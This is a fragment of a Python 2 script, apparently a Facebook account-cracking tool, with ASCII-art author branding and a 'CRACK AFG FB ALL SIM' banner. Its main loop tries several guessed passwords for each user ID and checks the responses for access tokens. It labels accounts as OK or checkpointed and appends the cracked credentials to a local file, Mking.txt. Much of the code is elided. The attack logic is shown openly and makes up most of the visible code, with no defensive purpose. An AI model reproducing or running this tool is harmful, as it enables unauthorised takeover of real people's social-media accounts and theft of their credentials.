...
#Mking Logo
logo ="""
\033[1;91m    88888888ba,    88  888b      88    ,ad8888ba,
...
\033[1;97m    
\033[1;97m----------------------------------------------------------------
\033[1;91m    Author      : SHAH DINO BALOCH
\033[1;91m    GitHub      : https://github.com/DINOKING
\033[1;91m    Facebook : Shah Dino BaLoch
\033[1;91m    Fb Page    : Raes shah Dino Baloch
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY Shah Dino Baloch'
        print '\x1b[1;92m THISE SCRIPT CREATED BY Shah Dino baloch '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print ' \x1b[1;93m[DINO_CP] ' + k + c + user + ' | ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print ' \x1b[1;93m[DINO_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[DINO_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Mking.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[DINO_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[DINO_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Mking.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[DINO_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[DINO_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Mking.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[DINO_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
